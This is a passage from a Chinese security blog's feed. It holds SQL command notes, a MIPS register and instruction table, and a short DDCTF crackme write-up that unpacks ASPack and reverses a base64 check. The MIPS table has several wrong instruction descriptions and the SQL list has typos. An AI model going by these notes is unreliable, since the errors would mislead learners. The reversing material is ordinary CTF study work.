title="数据库表"></a>数据库表</h3><p>数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。</p><h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p><code>SELECT * FROM Customers;</code></p><h3 id="一些重要的SQL命令"><a href="#一些重要的SQL命令" class="headerlink" title="一些重要的SQL命令"></a>一些重要的SQL命令</h3><ul><li><p>SELECT：从数据库中提取数据</p></li><li><p>UPDATE：更新数据库中的数据</p></li><li><p>DALETE：从数据库中删除数据</p></li><li><p>INSERT INTO：向数据库中插入新数据</p></li><li><p>CREATE DATABASE：创建新数据库</p></li><li><p>ALTER DATABASE:修改数据库</p></li><li><p>CREATE TABLE：创建数据库</p></li><li><p>ALTER TABLE:变更数据库表</p></li><li><p>DROP TABLE:删除表</p></li><li><p>CREATE INDEX：创建索引</p></li><li><p>DROP INDEX：删除索引</p></li><li><p>SELECT:<code>SELECT column_name(s) FROM table_name</code></p></li><li><p>SELECT语句和WHERE子句：<code>SELECT [*] FROM [TableName] WHERE [condition]</code></p></li><li><p>SELECT语句和WHERE和/或子句：<code>SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]...</code></p></li><li><p>SELECT语句与ORDER BY:</p><ul><li><code>SELECT column_name()</code></li><li><code>FROM table_name</code></li><li><code>ORDER BY column_name() ASC or DESC</code></li></ul></li><li><p>SELECT DISTINCT（区分）子句：</p><ul><li><code>SELECT DISTINCT column1,...columnN</code></li><li><code>FROM table_name;</code></li></ul></li><li><p>SELECT IN子句：</p><ul><li><code>SELECT column1,column2...columnN</code></li><li><code>FROM table_name</code></li><li><code>WHERE column_name IN (val-1,val-2,...val-N);</code></li></ul></li><li><p>SELECT LIKE(类)子句：</p><ul><li><code>SELECT column1,column2...columnN</code></li><li><code>FROM table_name</code></li><li><code>WHERE column_name LIKE {PATTERN};</code></li></ul></li><li><p>SELECT COUNT（计数）子句：</p><ul><li><code>SELECT COUNT(column_name)</code></li><li><code>FROM table_name</code></li><li><code>WHERE CONDITION;</code></li></ul></li><li><p>SELECT与HAVING子句：</p><ul><li><code>SELECT SUM(column_name)</code></li><li><code>FROM table_name</code></li><li><code>WHERE CONDITION</code></li><li><code>GROUP BY column_name</code></li><li><code>HAVING (arithematic function condition);</code></li></ul></li><li><p>INSERT INTO语句：</p><ul><li><code>INSERT INTO table_name(column1,column2,column3,...)</code></li><li><code>VALUES (value,value1,value2,value3...)</code></li></ul></li><li><p>UPDATE语句：</p><ul><li><code>UPDATE table_name</code></li><li><code>SET column=value,column1=value1</code></li><li><code>WHERE someColumn=someValue</code></li></ul></li><li><p>DELETE语句：</p><ul><li><code>DELETE FROM tableName</code></li><li><code>WHERE someColumn=someValue</code></li></ul></li><li><p>CREATE语句：</p><ul><li><code>CREATE TABLE table_name(column1  datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns ));</code></li></ul></li><li><p>DROP语句：</p><ul><li><code>DROP TABLE table_name;</code></li></ul></li><li><p>DROP INDEX语句：</p><ul><li><code>AL TER TABLE table_name</code></li><li><code>DROP INDEX index_name;</code></li></ul></li><li><p>DESC语句：</p><ul><li><code>DESC table_name;</code></li></ul></li><li><p>TRUNCATE截断表语句：</p><ul><li><code>TRUNCATE TABLE table_name;</code></li></ul></li><li><p>ALTER TABLE语句：</p><ul><li><code>ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type};</code></li></ul></li><li><p>ALTER TABLE(对表名重命名)</p><ul><li><code>ALTER TABLE table_name RENAME TO new_table_name;</code></li></ul></li><li><p>USE语句：</p><ul><li><code>USE database_name;</code></li></ul></li><li><p>COMMIT语句：</p><ul><li><code>COMMIT;</code></li></ul></li><li><p>ROLLBACK语句：</p><ul><li><code>ROLLBACK;</code></li></ul></li></ul><h2 id="0x04-SQL选择"><a href="#0x04-SQL选择" class="headerlink" title="0x04 SQL选择"></a>0x04 SQL选择</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x01-SQL简介&quot;&gt;&lt;a href=&quot;#0x01-SQL简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 SQL简介&quot;&gt;&lt;/a&gt;0x01 SQL简介&lt;/h2&gt;&lt;p&gt;SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。&lt;</summary>
      
    
    
    
    
    <category term="学习记录" scheme="https://sinky.top/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>MIPS架构学习笔记</title>
    <link href="https://sinky.top/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://sinky.top/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2022-08-09T03:42:43.325Z</published>
    <updated>2022-08-09T03:42:07.688Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-寄存器"><a href="#0x01-寄存器" class="headerlink" title="0x01 寄存器"></a>0x01 寄存器</h1><h3 id="32个通用寄存器：-0-31-32位"><a href="#32个通用寄存器：-0-31-32位" class="headerlink" title="32个通用寄存器：$0-$31,32位"></a>32个通用寄存器：$0-$31,32位</h3><p>MIPS32中通用寄存器的约定用法：</p><p>|:–:|:–:|<br>|寄存器名字|约定名字|用途|<br>|$0|zero|总是为0|<br>|$1|at|留作汇编器生成一些合成指令|<br>|$2 $3|v0 v1|用来存放子程序返回值|<br>|$4<del>$7|a0</del>a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数|<br>|$8<del>$15|t0</del>t7|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$16<del>$23|s0</del>s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变|<br>|$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复|<br>|$26 $27|$k0 $k1|由异常处理程序使用|<br>|$28或$gp|gp|全局指针|<br>|$29或$sp|sp|堆栈指针|<br>|$30或$fp|s8/sp|子程序可以用来做堆栈帧指针|<br>|$31|ra|存放子程序返回地址|</p><h3 id="特殊寄存器"><a href="#特殊寄存器" class="headerlink" title="特殊寄存器"></a>特殊寄存器</h3><ul><li>PC:程序计数器</li><li>HI:乘除结果高位寄存器</li><li>LO:乘除结果低位寄存器</li></ul><p><b>MIPS架构属于小端模式</b></p><h3 id="MIPS指令"><a href="#MIPS指令" class="headerlink" title="MIPS指令"></a>MIPS指令</h3><p>|:—-:|:—-:|<br>|指令|功能|<br>|LB|从存储器中读取一个字节的数据到寄存器中|<br>|LH|从存储器中读取半个字的数据到寄存器中|<br>|LW|从存储器中读取一个字的数据到寄存器中|<br>|LD|从存储器中读取双字的数据到寄存器中|<br>|L.S|从存储器中读取单精度浮点数到寄存器中|<br>|L.D|从存储器中读取双精度浮点数到寄存器中|<br>|LBU|=LB,无符号数据|<br>|LHU|=LH,无符号数据|<br>|LWU|=LW,无符号数据|<br>|SB|把一个字节的数据从寄存器存储到存储器中|<br>|SH|把半个字节的数据从寄存器存储到存储器中|<br>|SW|把一个字的数据从寄存器存储到存储器中|<br>|SD|把两个字节的数据从寄存器存储到存储器中|<br>|S.S|把单精度浮点数从寄存器存储到存储器中|<br>|S.D|把双精度数据从存储器存储到存储器中|<br>|DADD|把两个定点寄存器的内容相加，即定点加|<br>|DADDI|把一个寄存器的内容加上一个立即数|<br>|DADDU|不带符号的加|<br>|DADDIU|把一个寄存器的内容加上一个无符号的立即数|<br>|ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数|<br>|ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数|<br>|ADD.PS|两个单精度浮点数相加，结果是单精度浮点数|<br>|DSUB|两个寄存器的内容相减|<br>|DSUBU|不带符号的减|<br>|SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数|<br>|SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数|<br>|SUB.PS|两个单精度浮点数相减|<br>|DDIV|两个顶点寄存器的内容相除|<br>|DDIVU|不带符号的除法运算|<br>|DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数|<br>|DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数|<br>|DIV.PS|两个单精度浮点数相除，结果为单精度|<br>|DMUL|两个定点寄存器的内容相乘|<br>|DMULU|无符号相乘|<br>|MUL.S|双浮点乘单浮点得单浮点|<br>|MUL.D|双浮点乘单浮点得双浮点|<br>|MUL.PS|两个单浮点乘，得单浮点|<br>|AND|与运算|<br>|ANDI|一个寄存器中的内容与一个立即数相与|<br>|OR|或运算|<br>|ORI||<br>|XOR|异或|<br>|XORI||<br>|BEQZ|条件转移指令，当寄存器中内容为0时转移发生|<br>|BENZ|条件转移指令，寄存器内容不为0时转移发生|<br>|BEQ|条件转移指令，两个寄存器内容相等是转移发生|<br>|BNE|条件转移指令，两个寄存器中内容不等时转移发生|<br>|J|直接跳转指令，跳转的地址在指令中|<br>|JR|使用寄存器的跳转指令，跳转的地址在寄存器中|<br>|JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中|<br>|JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31|<br>|MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器|<br>|MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器|<br>|MFC0|把一个数据从通用寄存器复制到特殊寄存器|<br>|MTC0|把一个数据从特殊寄存器复制到通用寄存器|<br>|MFC1|把一个数据从定点寄存器复制到浮点寄存器|<br>|MTC1|把一个数据从浮点寄存器复制到定点寄存器|<br>|LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零|<br>|DSLL|双字逻辑左移|<br>|DSRL|双字逻辑右移|<br>|DSRA|双字算术右移|<br>|DSLLV|可变的双字逻辑左移|<br>|DSRLV|可变的双字逻辑右移|<br>|DSRAV|可变的双字算术右移|<br>|SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0|<br>|SLTI|r2的值小于立即数，则r1为1，否则为0|<br>|SLTU|=SLT带符号|<br>|SLTUI|=SLT不带符号|<br>|MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器|<br>|MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器|<br>|TRAP|根据地址向量转入管态|<br>|ERET|从异常中返回到用户态|<br>|MADD.S|一个双浮点数与单浮点数相乘加，结果为单|<br>|MADD.D|一个双浮点数与单浮点数相乘加，结果为双|<br>|MADD.PS|两个单浮点数相乘加，结果为单|</p><h3 id="大端序小端序复习"><a href="#大端序小端序复习" class="headerlink" title="大端序小端序复习"></a>大端序小端序复习</h3><p>字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关，</p><p>大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-寄存器&quot;&gt;&lt;a href=&quot;#0x01-寄存器&quot; class=&quot;headerlink&quot; title=&quot;0x01 寄存器&quot;&gt;&lt;/a&gt;0x01 寄存器&lt;/h1&gt;&lt;h3 id=&quot;32个通用寄存器：-0-31-32位&quot;&gt;&lt;a href=&quot;#32个通用寄存器：-0</summary>
      
    
    
    
    
    <category term="IOT" scheme="https://sinky.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF RE windows_re2</title>
    <link href="https://sinky.top/2022/08/09/DDCTF2019re/"/>
    <id>https://sinky.top/2022/08/09/DDCTF2019re/</id>
    <published>2022-08-09T03:33:43.559Z</published>
    <updated>2022-08-11T14:22:40.890Z</updated>
    
    <content type="html"><![CDATA[<p>esp定律脱壳Aspack，然后ida分析一波。</p><figure class="highlight reasonml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-built_in">int</span> sub<span class="hljs-constructor">_401320()</span><br>{<br>  <span class="hljs-built_in">char</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-C04h]</span><br>  <span class="hljs-built_in">char</span> v2; <span class="hljs-comment">// [esp+9h] [ebp-C03h]</span><br>  <span class="hljs-built_in">char</span> v3; <span class="hljs-comment">// [esp+408h] [ebp-804h]</span><br>  <span class="hljs-built_in">char</span> v4; <span class="hljs-comment">// [esp+409h] [ebp-803h]</span><br>  <span class="hljs-built_in">char</span> v5; <span class="hljs-comment">// [esp+808h] [ebp-404h]</span><br>  <span class="hljs-built_in">char</span> v6; <span class="hljs-comment">// [esp+809h] [ebp-403h]</span><br>  v3 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v4</span>, 0, 0x3FF)</span>;<br>  v5 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v6</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"input code:"</span>);<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785526D4</span>]</span>(<span class="hljs-string">"%s"</span>, &amp;v3);<br>  <span class="hljs-keyword">if</span> ( !(unsigned __int8)sub<span class="hljs-constructor">_4011F0()</span> )<br>  {<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"invalid input\n"</span>);<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78542455</span>]</span>(<span class="hljs-number">0</span>);<br>  }<br>  sub<span class="hljs-constructor">_401240(&amp;<span class="hljs-params">v5</span>)</span>;<br>  v1 = <span class="hljs-number">0</span>;<br>  sub<span class="hljs-constructor">_401C6A(&amp;<span class="hljs-params">v2</span>, 0, 0x3FF)</span>;<br>  MEMORY<span class="hljs-literal">[<span class="hljs-number">0x78552E73</span>]</span>(&amp;v1, <span class="hljs-string">"DDCTF{%s}"</span>, &amp;v5);<br>  <span class="hljs-keyword">if</span> ( !strcmp(&amp;v1, <span class="hljs-string">"DDCTF{reverse+}"</span>) )<br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"You've got it !!! %s\n"</span>, &amp;v1);<br>  <span class="hljs-keyword">else</span><br>    MEMORY<span class="hljs-literal">[<span class="hljs-number">0x785520C1</span>]</span>(<span class="hljs-string">"Something wrong. Try again...\n"</span>);<br>  return <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>限制输入0-9,A-F,可想到十六进制</li><li>输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。</li></ul><p>先尝试输入字符串<code>1234567AAA</code>,得到加密后字符 <code>EjRWeqo=</code>,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。<br>将<code>reverse+</code>转换得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;esp定律脱壳Aspack，然后ida分析一波。&lt;/p&gt;
&lt;figure class=&quot;highlight reasonml&quot;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;</summary>
      
    
    
    
    
    <category term="RE" scheme="https://sinky.top/tags/RE/"/>
    
    <category term="ctf" scheme="https://sinky.top/tags/ctf/"/>
    
  </entry>
  
</feed>
